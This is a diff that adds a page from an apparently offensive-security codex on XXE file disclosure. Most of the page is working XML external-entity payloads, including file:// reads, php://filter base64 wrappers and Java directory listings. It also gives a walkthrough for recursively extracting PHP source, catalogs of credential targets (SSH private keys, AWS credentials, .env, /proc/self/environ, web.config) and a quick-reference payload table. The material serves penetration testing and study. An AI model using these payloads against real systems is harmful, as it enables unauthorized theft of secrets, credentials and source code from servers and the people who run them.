@@ -1,0 +1,406 @@
+---
+title: File Disclosure
+description: The canonical XXE primitive - reading server-side files via external entity resolution. Basic file:// reads, source code via php://filter/convert.base64-encode/ when XML special characters break the response, Java directory listings, and the catalog of high-value file targets per operating system and framework.
+mitre: [T1083, T1213]
+d3fend: [D3-IAA]
+impact: [FileRead, DataExfil, SourceCodeDisclosure]
+owasp: [A05]
+sidebar:
+  order: 3
+  label: File disclosure
+---
+
+## TL;DR
+
+Once you've confirmed external entity resolution works (see [Identifying](/codex/web/xxe/identifying/)), file disclosure is template-substitution. Two paths depending on what the file contains:
+
+```
+# Path 1 - file:// for plain-text files
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root><name>&xxe;</name></root>
+
+# Path 2 - php://filter/ for files that contain XML-breaking characters
+#   (source code with <, >, &) or binary content
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
+]>
+<root><name>&xxe;</name></root>
+# → response contains base64; decode with `echo '...' | base64 -d`
+
+# Path 3 - Java directory listing
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/">]>
+<root><name>&xxe;</name></root>
+# → directory contents (Java parsers only)
+```
+
+Success indicator: response body contains the file's contents (or its base64 encoding) where the entity was referenced.
+
+## Why two paths
+
+XML has reserved characters: `<`, `>`, `&`, `"`, `'`. When an entity is expanded into XML content, those characters break the parse. The parser either:
+
+- Errors out (no useful output)
+- Silently truncates at the first reserved character
+- Successfully renders the file because the file contains *no* reserved characters
+
+`/etc/passwd`, `/etc/hostname`, log files, plain-text configs - these typically work with raw `file://` because they're pure ASCII without `<`/`>`/`&`. Source code, HTML, XML, config files with embedded shell, and any binary content - these break unless wrapped.
+
+The wrapper of choice for PHP targets is `php://filter/convert.base64-encode/` because base64 output is XML-safe by definition (alphanumeric + `+`, `/`, `=` - none are reserved). For non-PHP targets, the CDATA approach in [Blind exfil](/codex/web/xxe/blind-exfil/) is the alternative.
+
+## Path 1 - plain-text file read
+
+The textbook payload:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+  <name>&xxe;</name>
+  <email>baseline@example.com</email>
+</root>
+```
+
+Response contains the file:
+
+```xml
+<message>Thanks root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...</message>
+```
+
+### Adapting to the target
+
+The URL scheme is `file:///` with three slashes - `file://` is the scheme separator, then a third `/` for the absolute path root. Some parsers tolerate `file:/etc/passwd` (one slash) but the three-slash form is portable.
+
+On Windows targets:
+
+```xml
+<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY xxe SYSTEM "file:///c:/boot.ini">
+<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">
+```
+
+Forward slashes work on Windows in `file://` URIs. Backslashes work in some parsers but break in others; default to forward slashes.
+
+### Output is truncated at `<`, `>`, or `&`
+
+If `/etc/hostname` returns fully but `/etc/passwd` returns only the first line, the parser is choking on something in the file. Two diagnostics:
+
+```shell
+# Check what the file actually contains at the suspected break point
+$ curl http://target/.../?file_disclosure | head -c 200
+# If it stops at a < or & character, that's the break
+```
+
+If the file has reserved characters, switch to Path 2.
+
+## Path 2 - php://filter wrapper for PHP targets
+
+For PHP-backed apps, the `php://filter/` wrapper lets the entity resolver apply a transformation before returning the content:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
+]>
+<root>
+  <name>&xxe;</name>
+</root>
+```
+
+Response contains base64:
+
+```
+PD9waHAKaW5jbHVkZSBfX0RJUl9fIC4gJy9jb25maWcucGhwJzsKLi4u
+```
+
+Decode:
+
+```shell
+$ echo 'PD9waHAKaW5jbHVkZSBfX0RJUl9fIC4gJy9jb25maWcucGhwJzsKLi4u' | base64 -d
+<?php
+include __DIR__ . '/config.php';
+...
+```
+
+### Wrapper anatomy
+
+```
+php://filter/<filter-chain>/resource=<file-path>
+```
+
+Filter chain is `convert.base64-encode` for source-code extraction. Other useful filters:
+
+| Filter | Effect | Use case |
+| --- | --- | --- |
+| `convert.base64-encode` | Base64 the output | Anything with `<`, `>`, `&`, or binary content |
+| `convert.iconv.UTF-8.UTF-16` | Re-encode UTF-8 to UTF-16 | Sometimes survives where base64 doesn't (rare) |
+| `zlib.deflate \| convert.base64-encode` | Compress then base64 | Large files (chain with `|`, URL-encoded `%7C`) |
+| `string.rot13` | ROT-13 | Curiosity; not generally useful |
+
+Always start with `convert.base64-encode` - it's the universal solution.
+
+### Path conventions
+
+The `resource=` value is the path the PHP wrapper opens. Try in order:
+
+| Path | Used by |
+| --- | --- |
+| Relative: `resource=index.php` | When the working directory is the webroot - most common |
+| Absolute Linux: `resource=/var/www/html/index.php` | When relative paths fail or you've identified the webroot from prior recon |
+| Absolute Windows: `resource=c:/inetpub/wwwroot/index.php` | Windows targets |
+
+Some parsers refuse relative paths in the wrapper - start with absolute when you know the webroot, fall back to relative when you don't.
+
+### Finding the webroot
+
+If absolute paths require knowing the webroot:
+
+```xml
+<!-- Often the simplest disclosure -->
+<!ENTITY xxe SYSTEM "file:///etc/apache2/sites-enabled/000-default.conf">
+
+<!-- Or nginx -->
+<!ENTITY xxe SYSTEM "file:///etc/nginx/sites-enabled/default">
+
+<!-- Or via /proc/self -->
+<!ENTITY xxe SYSTEM "file:///proc/self/cwd/index.php">
+```
+
+`/proc/self/cwd/` is a symlink to the process's working directory; reading `cwd/index.php` reads the index.php of whatever the PHP-FPM worker has cwd'd to. Bypasses the "I don't know where the webroot is" problem entirely on Linux.
+
+## Path 3 - Java directory listing
+
+Java's XML parsers historically allowed pointing entities at *directories*, returning a directory listing rather than a file's contents:
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/">
+]>
+<root><name>&xxe;</name></root>
+```
+
+Response:
+
+```
+adduser.conf
+alternatives/
+apache2/
+apt/
+bash.bashrc
+...
+```
+
+Useful when you don't know what files exist on the system. Listing `/`, `/etc/`, `/home/`, and `/var/www/` quickly maps interesting targets.
+
+This only works on Java parsers (and some older non-PHP parsers). PHP returns an error or empty when handed a directory. If you're on a PHP target, see [Identifying](/codex/web/xxe/identifying/) for how to detect framework.
+
+## High-value file targets
+
+The catalog, organized by what you're trying to accomplish:
+
+### Linux system reconnaissance
+
+| File | Contents |
+| --- | --- |
+| `/etc/passwd` | Users (UIDs, home dirs, shells) |
+| `/etc/shadow` | Password hashes (root-only; usually inaccessible) |
+| `/etc/hostname` | Server hostname |
+| `/etc/hosts` | Local DNS overrides |
+| `/etc/resolv.conf` | DNS server config |
+| `/etc/os-release` | Linux distribution |
+| `/etc/issue` | Login banner - often shows distro |
+| `/proc/version` | Kernel version |
+| `/proc/self/environ` | Process environment variables - sometimes leaks credentials |
+| `/proc/self/cmdline` | Process command line |
+| `/proc/self/cwd/` | Symlink to current working directory |
+| `/proc/self/fd/0`, `/proc/self/fd/1` | File descriptors (sometimes useful for log access) |
+
+### Web server config
+
+| File | Contents |
+| --- | --- |
+| `/etc/apache2/apache2.conf` | Apache main config |
+| `/etc/apache2/sites-enabled/000-default.conf` | Apache vhost config (reveals webroot) |
+| `/etc/nginx/nginx.conf` | Nginx main config |
+| `/etc/nginx/sites-enabled/default` | Nginx vhost config |
+| `/etc/php/<version>/apache2/php.ini` | PHP config (reveals enabled modules, including `expect`) |
+| `/usr/local/etc/php/php.ini` | Alternative PHP config path |
+
+### Application source code
+
+| File | Likely path |
+| --- | --- |
+| `index.php` | `/var/www/html/index.php`, `/srv/www/index.php`, `/app/index.php` |
+| `config.php`, `db.php`, `.env` | Database credentials, API keys |
+| `wp-config.php` (WordPress) | `/var/www/html/wp-config.php` - DB creds, secret keys |
+| `application.properties` (Spring) | `/opt/app/application.properties` - DB creds |
+| `appsettings.json` (.NET Core) | `/var/www/app/appsettings.json` |
+| `settings.py` (Django) | `/srv/django/myapp/settings.py` - SECRET_KEY, DB |
+| `manage.py` (Django) | Reveals project name |
+
+### Credentials and secrets
+
+| File | Contents |
+| --- | --- |
+| `/home/<user>/.ssh/id_rsa` | SSH private key - direct lateral movement |
+| `/home/<user>/.ssh/authorized_keys` | Confirms an account, lists trusted keys |
+| `/root/.ssh/id_rsa` | Root SSH key (usually root-only) |
+| `/home/<user>/.bash_history` | Command history - sometimes contains passwords typed inline |
+| `/home/<user>/.aws/credentials` | AWS access keys |
+| `/home/<user>/.docker/config.json` | Docker registry credentials |
+| `/var/lib/mysql/mysql.sock` | MySQL socket - confirms MySQL running |
+
+### Windows targets
+
+| File | Contents |
+| --- | --- |
+| `c:/windows/win.ini` | Tiny baseline file; proves Windows + file read |
+| `c:/windows/system.ini` | System config |
+| `c:/boot.ini` | Boot config (legacy) |
+| `c:/windows/system32/drivers/etc/hosts` | Windows hosts file |
+| `c:/inetpub/wwwroot/web.config` | IIS app config - DB connection strings, machine keys |
+| `c:/inetpub/logs/LogFiles/` | IIS logs (Java-style directory listing) |
+| `c:/Users/<user>/.ssh/id_rsa` | SSH key if installed |
+| `c:/Windows/System32/config/SAM` | Hashes (LSASS access required; usually blocked) |
+
+### Docker / container targets
+
+| File | Contents |
+| --- | --- |
+| `/.dockerenv` | Presence proves you're in a container |
+| `/proc/self/cgroup` | Container ID and cgroup info |
+| `/etc/hostname` | Container hostname (often randomized) |
+| `/.docker/config.json` | Container registry credentials |
+| Environment via `/proc/self/environ` | Often contains AWS creds, DB creds, app secrets |
+
+## Worked walkthrough - extracting `index.php`
+
+Suppose you have an XXE on a PHP contact form and want the app's source.
+
+### Attempt 1 - direct file://
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///var/www/html/index.php">
+]>
+<root><name>&xxe;</name><email>x</email></root>
+```
+
+Response:
+
+```
+Thanks 
+```
+
+Empty. The `<?php` opening tag's `<` character broke parsing. Switch to wrapper.
+
+### Attempt 2 - php://filter
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
+]>
+<root><name>&xxe;</name><email>x</email></root>
+```
+
+Response:
+
+```
+Thanks PD9waHAKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9TRVNTSU9OWyd1aWQnXSkpIHsKICAgIGhlYWRlcignTG9jYXRpb246IC9wcm9maWxlLnBocCcpOwogICAgZXhpdDsKfQouLi4=
+```
+
+Decode:
+
+```shell
+$ echo 'PD9waHAKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9TRVNTSU9OWyd1aWQnXSkpIHsKICAgIGhlYWRlcignTG9jYXRpb246IC9wcm9maWxlLnBocCcpOwogICAgZXhpdDsKfQouLi4=' | base64 -d
+<?php
+session_start();
+if (isset($_SESSION['uid'])) {
+    header('Location: /profile.php');
+    exit;
+}
+...
+```
+
+The source code is now in hand. Repeat for every PHP file referenced by index.php (`include` / `require` statements give you the paths to enumerate next).
+
+### Recursive source extraction
+
+Once you have one file, look for `include`, `require`, `include_once`, `require_once` statements. Each names another file:
+
+```php
+include 'config.php';
+require_once __DIR__ . '/db.php';
+include('/var/www/html/lib/auth.php');
+```
+
+Loop: for each `include`/`require`, run the same XXE against the named file. After 3-5 iterations you've usually got the entire source tree.
+
+For automation, see [Automation](/codex/web/xxe/automation/) - XXEinjector can mass-extract.
+
+## Edge cases
+
+### File too large
+
+Some parsers truncate entity content after a fixed size (libxml has a 10MB default). Large log files or binaries may come back partial. Workarounds:
+
+- Use a path filter that targets a specific section: `php://filter/read=string.toupper/resource=...` doesn't help with size; you'd have to read by offset
+- Use multiple entities chained for offset reading - complex; usually easier to find a smaller file
+
+### Permission errors
+
+Reading `/etc/shadow` typically fails because the PHP-FPM user isn't root. The error response varies:
+
+- Empty content (parser silently failed)
+- HTTP 500 with stack trace
+- Original response with empty entity expansion
+
+`/etc/shadow` is essentially never readable via XXE on a well-configured system. Move on to `/home/<user>/.ssh/id_rsa` for the same kind of payoff.
+
+### Path with special characters
+
+```xml
+<!ENTITY xxe SYSTEM "file:///path/with spaces/file.txt">
+```
+
+Spaces in paths sometimes need URL-encoding:
+
+```xml
+<!ENTITY xxe SYSTEM "file:///path/with%20spaces/file.txt">
+```
+
+Either may work depending on parser. Try unencoded first; URL-encode if it fails.
+
+### Encoding mismatch
+
+The response is gibberish even though the file should be plain text. Possibilities:
+
+- File is UTF-16 or another encoding; specify in the XML declaration `<?xml version="1.0" encoding="UTF-16"?>` - rarely needed for Linux text files
+- Parser is wrapping the output in unexpected encoding; try `convert.base64-encode` and decode manually
+
+## Quick reference
+
+| Task | Payload |
+| --- | --- |
+| Plain text file | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
+| PHP source code | `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">` |
+| Windows file | `<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">` |
+| Java directory listing | `<!ENTITY xxe SYSTEM "file:///etc/">` |
+| Find current webroot | `<!ENTITY xxe SYSTEM "file:///proc/self/cwd/index.php">` (Linux only) |
+| Read SSH key | `<!ENTITY xxe SYSTEM "file:///home/USERNAME/.ssh/id_rsa">` |
+| Read process environment | `<!ENTITY xxe SYSTEM "file:///proc/self/environ">` |
+| Read Apache vhost | `<!ENTITY xxe SYSTEM "file:///etc/apache2/sites-enabled/000-default.conf">` |
+| Read .env (Laravel, generic) | `<!ENTITY xxe SYSTEM "file:///var/www/html/.env">` |
+| Decode base64 response | `echo 'BASE64' \| base64 -d` |
+| If content truncates at `<` | Switch to `php://filter/convert.base64-encode/` |
+| If non-PHP target | See [Blind exfil](/codex/web/xxe/blind-exfil/) for CDATA wrap |
+| If no reflection | See [Blind exfil](/codex/web/xxe/blind-exfil/) for OOB exfil |
+| Recursive source extraction | Find `include`/`require` in extracted source; loop on named files |
+
+For attacks beyond file read (SSRF, RCE via expect, DoS), see [RCE and SSRF](/codex/web/xxe/rce-and-ssrf/). For the blind variants when no response reflection is available, see [Blind exfil](/codex/web/xxe/blind-exfil/).
